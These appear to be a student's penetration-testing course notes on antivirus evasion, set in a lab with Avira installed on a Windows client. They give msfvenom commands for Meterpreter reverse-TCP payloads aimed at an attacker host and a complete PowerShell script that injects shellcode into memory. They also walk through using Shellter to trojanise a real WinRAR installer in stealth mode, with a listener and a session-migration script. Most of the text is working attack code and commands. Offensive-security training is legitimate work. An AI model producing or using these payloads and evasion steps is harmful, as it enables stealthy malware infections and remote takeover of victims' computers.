

Originally designed to remove viruses, AV's typically include firewalls, site scanners, etc.  
  
[https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/](https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/)  
  
  
Test Setup:  
  
- Create a Meterpreter payload:  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe > binary.exe
```

- Upload to VirusTotal:  
	** Convenient but it generates a hash for each unique submission, which is then shared with all participating AV vendors.  
	  As such, take care when submitting sensitive payloads as the hash is essentially considered public from the time of first submission.

![[virus-total-bad.png]]

- Use **nc** OR
```bash
python3 -m http.server 80
```
	to upload to Windows client  
  
- Install Avira on Win client:
```powershell
 C:\Tools\antivirus_evasion\
```

- Turn _Real_-_Time Protection_ on  
  
- Attempt to run _**binary.exe**_
	![[avira-alert.png]]

AV evasion falls into two broad categories: [on-disk](14.2.1%20-%20On-Disk.md) and [in-memory](14.2.2%20-%20In-Memory.md).
  
Given the maturity of AV file scanning, modern malware often attempts **in-memory** operation, avoiding the disk entirely and therefore reducing the possibility of being detected.  



### PowerShell In-Memory Injection:

Will use a technique similar to Remote Process Memory Injection.  
Main difference - we'll target the currently executing process: PowerShell Interpreter.  
```powershell
$code = '  
[DllImport("kernel32.dll")]  
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
  
[DllImport("kernel32.dll")]  
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);  
  
[DllImport("msvcrt.dll")]  
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';  
  
$winFunc =   
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;  
 
[Byte[]]$sc = <place your shellcode here>;  
  
$size = 0x1000;  
  
if ($sc.Length -gt 0x1000) {$size = $sc.Length};  
  
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);  
  
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};  
  
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
.
- Imports _VirtualAlloc_ from _kernel32.dll_  
	- (to allocate memory - Lines 2 - 3)  
- Imports _CreateThread_ from _kernel32.dll_  
	- (create an execution thread - Lines 5 - 6)  
- Imports _memset_ from _msvcrt.dll_  
	- (write arbitrary data to the allocated memory - Lines 8 - 9)  
- Allocates a block of memory using _VirtualAlloc_  
	- (Lines 14 & 19 - 21)  
- Takes each byte of the payload stored in the _$sc_ byte array & Writes it to our newly allocated memory block using _memset_
	- (Lines 15 & 23)  
- Execute in separate thread  
	- (Line 25)  
  
Payload (meterpreter) creation:  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f powershell
```


In order to get it to run, you need to be mindful of the user's [Execution Policy](Execution%20Policy.md).  
  
  
From [Exercise #6:](e17%20-%20AV%20Evasion.md#17.3.5.6) 
  
Although the PowerShell AV bypass we covered in this module is substantial, it has an inherent limitation:  
The malicious script cannot be "double-clicked" by the user for an immediate execution. Instead, it would open in **notepad.exe** or another default text editor.  
  
The tradecraft of manually weaponizing PowerShell scripts is beyond the scope of this module, but we can rely on another open-source framework to help us automate this process.  
Research how to install and use the [Veil](https://github.com/Veil-Framework/Veil) framework to help  

  
  
### Shellter:

[Shellter](Shellter.md) is a dynamic shellcode injector which can bypass AVs.  
  
We'll run in Auto mode for this example:  

Download 32-bit version of **winrar.exe** from [https://www.rarlab.com/download.htm](https://www.rarlab.com/download.htm) onto Kali  
  
In Shellter:  
- Select a Target PE (full/path/**winrar.exe**)  
- Choose Stealth Mode - Y  
- Choose Payload - Meterpreter Reverse TCP  
- Set Meterpreter Options - LHOST & LPORT  
  
In Kali:  
- Start a Meterpreter listener to catch the conn:  
```bash
msfconsole -x "use exploit/multi/handler; set LHOST <attacker_ip>; set LPORT <port>; set PAYLOAD windows/meterpreter/reverse_tcp"
```

Transfer file to compromised Win machine.  
  
*****NOTE:** As it stands, the successful Meterpreter session will close out once the installer is either finished running OR is cancelled.  
  
Add an _AutoRunScript_ to migrate Meterpreter to a separate process immediately after session creation:  
```bash
set AutoRunScript post/windows/manage/migrate
```

Run compromised binary